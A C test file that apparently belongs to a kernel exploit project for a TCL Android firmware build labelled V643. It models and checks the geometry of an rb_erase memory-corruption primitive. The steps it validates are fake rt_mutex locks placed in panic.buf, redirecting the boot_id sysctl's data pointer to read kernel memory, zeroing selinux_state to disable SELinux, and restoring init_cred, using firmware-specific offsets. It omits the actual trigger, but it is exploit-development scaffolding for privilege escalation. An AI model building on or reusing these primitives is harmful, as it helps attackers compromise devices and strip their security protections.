#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "tcl_v643/compat_select_geometry.h"

static int fail(const char *message) {
  fprintf(stderr, "FAIL: %s\n", message);
  return 1;
}

/* Model the exact one-child branch seen in V643 rb_erase at
 * ffffffc0089747b8.  This deliberately uses local byte arrays only; it does
 * not contain a syscall, a runtime kernel pointer or an exploit trigger. */
int main(void) {
  const uint64_t scratch_start = TCL_V643_PANIC_BUF_OFF;
  const uint64_t scratch_end = scratch_start + TCL_V643_PANIC_BUF_SIZE;

  if ((scratch_start & 7) != 0)
    return fail("panic.buf is not naturally aligned for rt_mutex fields");
  if (TCL_V643_DIRECT_LOCK_SLOT_STRIDE != 0x20)
    return fail("fake-lock stride no longer matches rt_mutex_base size");
  if (TCL_V643_DIRECT_LOCK_SLOT_COUNT *
          TCL_V643_DIRECT_LOCK_SLOT_STRIDE != TCL_V643_PANIC_BUF_SIZE)
    return fail("fake-lock slots do not exactly cover panic.buf");
  if (scratch_start +
          (TCL_V643_DIRECT_LOCK_SLOT_COUNT - 1) *
              TCL_V643_DIRECT_LOCK_SLOT_STRIDE +
          TCL_V643_DIRECT_LOCK_SLOT_STRIDE != scratch_end)
    return fail("last fake lock exceeds panic.buf");

  /* Abstract kernel objects.  pc models rb_node.__rb_parent_color, target
   * models rb_left, and data_field models ctl_table.data. */
  uint8_t parent_object[24];
  uint64_t data_field = UINT64_C(0x1111111111111111);
  const uint64_t original_low = UINT64_C(0x8877665544332211);
  const uint64_t parent_address = UINT64_C(0xffffffc012340000);
  const uint64_t data_field_address = UINT64_C(0xffffffc056780000);
  const uint64_t fake_node_address = UINT64_C(0xffff800000001000);

  memset(parent_object, 0, sizeof(parent_object));
  memcpy(parent_object, &original_low, sizeof(original_low));

  /* Exact V643 rb_erase one-left-child effects:
   *   target->__rb_parent_color = pc
   *   parent->rb_right = target, unless parent->rb_left == fake node.
   * For an ordinary parent object the comparison misses, so +8 is clobbered.
   * Here target is the ctl_table.data field. */
  data_field = parent_address;
  uint64_t parent_left = 0;
  const unsigned collateral_off =
      parent_left == fake_node_address ? 16U : 8U;
  memcpy(parent_object + collateral_off, &data_field_address,
         sizeof(data_field_address));

  if (data_field != parent_address)
    return fail("rb_erase did not redirect ctl_table.data");

  uint64_t readback[2] = {0, 0};
  memcpy(&readback[0], parent_object, sizeof(readback[0]));
  memcpy(&readback[1], parent_object + 8, sizeof(readback[1]));
  if (readback[0] != original_low)
    return fail("readback low word is not the original parent word");
  if (readback[1] != data_field_address)
    return fail("collateral marker does not validate the readback");

  if (TCL_V643_BOOT_ID_CTL_DATA_FIELD_OFF != 0x027f6500ULL ||
      TCL_V643_SYSCTL_BOOTID_OFF != 0x0295bce1ULL)
    return fail("V643 boot_id anchors changed");

  /* Exact V643 rb_erase no-left-child branch at +0x4c.  With both children
   * NULL and a RED victim (pc bit 0 clear), it stores rb_right == NULL into
   * the selected parent slot and returns without a child update or color
   * rebalance.  For pc=(target-8), the ordinary parent-slot selection is
   * exactly target.  This is the clean SELinux zero-write used by Sabrina. */
  uint64_t selinux_state_qword = UINT64_C(0xffffffffffffffff);
  uint64_t selinux_adjacent_qword = UINT64_C(0x8877665544332211);
  const uint64_t selinux_target = TCL_V643_KIMAGE_TEXT_BASE +
                                  TCL_V643_SELINUX_STATE_OFF;
  const uint64_t red_parent_color = selinux_target - 8;
  const uint64_t null_right_child = 0;
  const uint64_t null_left_child = 0;
  if ((red_parent_color & 1) != 0 || null_left_child != 0 ||
      null_right_child != 0)
    return fail("SELinux zero-write shape is not a red leaf");
  selinux_state_qword = null_right_child;
  if (selinux_state_qword != 0)
    return fail("red-leaf rb_erase did not zero selinux_state");
  if (selinux_adjacent_qword != UINT64_C(0x8877665544332211))
    return fail("red-leaf zero-write unexpectedly has collateral");

  /* A parent_color of zero is a useful repair primitive: rb_erase writes
   * zero to the chosen target, skips the parent dereference and puts target
   * only in the current scratch lock's rb_root.  Exact V643 init_cred bytes
   * show that the word at init_cred+8 (gid/suid) starts as zero. */
  uint64_t init_cred_gid_suid = UINT64_C(0xfeedfacefeedface);
  const uint64_t zero_parent_color = 0;
  init_cred_gid_suid = zero_parent_color;
  if (init_cred_gid_suid != 0)
    return fail("zero-parent repair does not restore init_cred+8");

  /* The exact symbol interval for non_irq_wake_reason is 0x100 bytes.  The
   * V643 parent candidate and its collateral qword both remain inside it. */
  const uint64_t wake_start = TCL_V643_NON_IRQ_WAKE_REASON_OFF;
  const uint64_t wake_end = wake_start +
                            TCL_V643_NON_IRQ_WAKE_REASON_SIZE;
  const uint64_t selinux_parent = TCL_V643_KIMAGE_TEXT_BASE +
                                  TCL_V643_SELINUX_STAMP_PARENT_OFF;
  if (TCL_V643_SELINUX_STAMP_PARENT_OFF < wake_start ||
      TCL_V643_SELINUX_STAMP_PARENT_OFF + 16 > wake_end)
    return fail("SELinux parent/collateral escapes non_irq_wake_reason");
  if ((selinux_parent & 0xffff) != 0 ||
      ((selinux_parent >> 16) & 0xff) == 0)
    return fail("SELinux parent does not encode 0,0,nonzero in low bytes");
  uint8_t selinux_prefix[8];
  memcpy(selinux_prefix, &selinux_parent, sizeof(selinux_prefix));
  if (selinux_prefix[0] != 0 || selinux_prefix[1] != 0 ||
      selinux_prefix[2] == 0)
    return fail("SELinux enforcing/checkreqprot/initialized prefix is wrong");

  /* Model the exact one-child stores used by the preserving route:
   *   *selinux_state = child
   *   *child         = (selinux_state - 8) | RB_BLACK
   * The second store may corrupt only the diagnostic wake-reason buffer. */
  uint8_t selinux_state_prefix[8];
  uint8_t wake_reason[0x100];
  memset(selinux_state_prefix, 0xff, sizeof(selinux_state_prefix));
  memset(wake_reason, 'W', sizeof(wake_reason));
  memcpy(selinux_state_prefix, &selinux_parent, sizeof(selinux_parent));
  const uint64_t selinux_pc = (selinux_target - 8) | 1;
  const size_t stamp_in_wake =
      (size_t)(TCL_V643_SELINUX_STAMP_PARENT_OFF - wake_start);
  if (stamp_in_wake + sizeof(selinux_pc) > sizeof(wake_reason))
    return fail("preserving route collateral escapes wake-reason buffer");
  memcpy(wake_reason + stamp_in_wake, &selinux_pc, sizeof(selinux_pc));
  if (selinux_state_prefix[0] != 0 || selinux_state_prefix[1] != 0 ||
      selinux_state_prefix[2] == 0)
    return fail("preserving route does not keep initialized non-zero");

  printf("panic scratch: [%#llx,%#llx) = %u slots x %#x\n",
         (unsigned long long)scratch_start,
         (unsigned long long)scratch_end,
         TCL_V643_DIRECT_LOCK_SLOT_COUNT,
         TCL_V643_DIRECT_LOCK_SLOT_STRIDE);
  printf("boot_id: ctl_table.data=+%#llx uuid=+%#llx\n",
         (unsigned long long)TCL_V643_BOOT_ID_CTL_DATA_FIELD_OFF,
         (unsigned long long)TCL_V643_SYSCTL_BOOTID_OFF);
  printf("SELinux candidate: parent=+%#llx collateral stays in "
         "non_irq_wake_reason\n",
         (unsigned long long)TCL_V643_SELINUX_STAMP_PARENT_OFF);
  printf("SELinux red-leaf zero: target=+%#llx, no child/collateral store\n",
         (unsigned long long)TCL_V643_SELINUX_STATE_OFF);
  puts("PASS: exact V643 direct rb_erase/readback geometry is modeled");
  puts("CAUTION: arbitrary non-zero writes still have collateral; the red-leaf zero does not");
  return 0;
}
